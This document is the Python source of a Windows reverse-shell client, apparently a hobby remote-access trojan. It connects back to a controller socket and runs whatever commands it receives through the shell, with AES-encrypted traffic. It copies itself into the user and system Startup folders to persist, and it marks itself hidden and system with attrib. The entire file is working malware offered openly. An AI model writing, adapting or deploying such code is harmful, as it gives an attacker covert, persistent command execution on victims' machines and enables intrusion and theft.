import os
import socket
import subprocess
import shutil
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding


IV=b"@#H~/*-+*GFB}{:<"  #initialisation vector
key=b"!%^$GCV*&():'/.hdc=\/*-9650...32"# # aes key


# this code can be run even before the server starts....... pretty cool right
c=socket.socket()

def conn():
    while True:
        data1=c.recv(1024)
        # print(data1)
        data=str(decrypt(data1),"utf-8")
        # print(data)
        if (data[:2]=="cd"):
#cd command works differently as it doesnt send any data  back to server....... 
            os.chdir(data[3:])
        if len(data)>0:
            cmd=subprocess.Popen(data[:],shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            output_bytes=cmd.stdout.read()+cmd.stderr.read()
            output_string1=str(output_bytes,"utf-8") + os.getcwd() +'> '
        # output_string=str(cmd)
        # out=str(data.decode('utf-8'))
        # output_string=subprocess.check_call(out,shell=True)
            output_string=encrypt(output_string1.encode())
            # print(output_string)
            # print(output_string.decode())
            # c.send(output_string+str.encode(str(os.getcwd())+'> '))
            c.send(output_string)
        # c.send(bytes(output_string,'utf-8'))

#c.close()

def persist():
    path=os.getcwd().strip('\n') #current directory of our file
    #destination is the desired place
    Null, userprof=subprocess.check_output('set userprofile',shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE).decode().split('=')
    destination=userprof.strip('\n\r')+'\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\'+'client.pyw'
    destination1='C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\'+'client.pyw'
    try:
        if not os.path.exists(destination1):
            shutil.copyfile(path+'\client.pyw',destination1) # tries to hide program in root folder
    except:
        if not os.path.exists(destination):
            shutil.copyfile(path+'\client.pyw',destination) #tries to hide program in user specific folder

    # os.system("attrib +r +s +h client.pyw")
        #os.system("attrib +r +s +h C:\Users\HARSH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\client.pyw")


def encrypt(message):
    encryptor=AES.new(key,AES.MODE_CBC,IV)
    padded_message=Padding.pad(message,16)
    encrypted_message=encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor=AES.new(key,AES.MODE_CBC,IV)
    decrypted_padded_message=decryptor.decrypt(cipher)
    decrypted_message=Padding.unpad(decrypted_padded_message,16)
    return decrypted_message 
    

def car():
    c.connect(("localhost",9999))
    conn()

if __name__=="__main__":
    persist()
    os.system("attrib +r +s +h client.pyw")
    while True:
        try:
            car()
        except  ConnectionRefusedError:
            #add sleep function to give it some rest
            pass
    
